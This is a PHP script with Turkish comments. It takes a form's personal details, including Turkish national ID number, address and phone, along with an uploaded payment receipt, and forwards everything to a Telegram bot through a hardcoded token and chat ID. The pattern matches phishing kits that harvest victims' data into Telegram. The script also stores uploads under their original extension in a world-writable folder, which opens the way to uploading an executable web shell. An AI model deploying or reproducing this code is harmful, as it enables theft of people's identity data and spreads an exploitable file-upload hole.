<?php
// POST isteğiyle gelen form verilerini al
$ad = $_POST['ad'] ?? '';
$soyad = $_POST['soyad'] ?? '';
$telno = $_POST['telno'] ?? '';
$il = $_POST['il'] ?? '';
$ilce = $_POST['ilce'] ?? '';
$mahalle = $_POST['mahalle'] ?? '';
$tcno = $_POST['tcno'] ?? '';
$adres = $_POST['adres'] ?? '';

// Hedef klasörü kontrol et ve yoksa oluştur
$klasor_yolu = 'path/to/uploads/';
if (!file_exists($klasor_yolu)) {
    mkdir($klasor_yolu, 0777, true); // İzinler 0777 olarak ayarlanmıştır, bu güvenlik riski oluşturabilir. Daha güvenli bir ayar kullanmanızı öneririm.
}

// Dekont dosyasını geçici klasöre kaydet
$dekont_tmp_path = $_FILES['dekont']['tmp_name'];
$dekont_name = $_FILES['dekont']['name'];
$dekont_new_name = uniqid('', true) . '.' . pathinfo($dekont_name, PATHINFO_EXTENSION);
$dekont_destination = $klasor_yolu . $dekont_new_name;

// Dosyayı hedef klasöre taşı
if (!move_uploaded_file($dekont_tmp_path, $dekont_destination)) {
    die("Dosya yüklenirken bir hata oluştu!");
}

// Telegram botunuza post etmek için gerekli ayarları yapın
$telegramBotToken = '6995811141:AAE_0Jn4YsXOe_Codc54pIh-8Jx-msI5ydE'; // Telegram botunuzun token'ını buraya girin
$chatId = '7124960346'; // Mesajı göndermek istediğiniz sohbetin ID'sini buraya girin

// Telegram'a gönderilecek mesajı oluştur
$message = "Yeni teslimat bilgisi:\n";
$message .= "Ad: $ad\n";
$message .= "Soyad: $soyad\n";
$message .= "Telefon Numarası: $telno\n";
$message .= "İl: $il\n";
$message .= "İlçe: $ilce\n";
$message .= "Mahalle/Köy: $mahalle\n";
$message .= "TC Kimlik Numarası: $tcno\n";
$message .= "Adres: $adres";

// Dekont dosyasının yolunu belirleyin
$dekont_dosya_yolu = realpath($dekont_destination);

// CURL ile POST isteği oluşturun
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegramBotToken/sendPhoto");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chatId,
    'photo' => new CURLFile($dekont_dosya_yolu),
    'caption' => $message
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// CURL isteğini gerçekleştirin
$response = curl_exec($ch);

// CURL isteğinin başarılı bir şekilde gönderilip gönderilmediğini kontrol edin
if ($response === false) {
    echo "Dekont gönderilirken bir hata oluştu!";
} else {
    echo "Dekont inceleme için başarıyla gönderildi!";
}

// CURL bağlantısını kapatın
curl_close($ch);
?>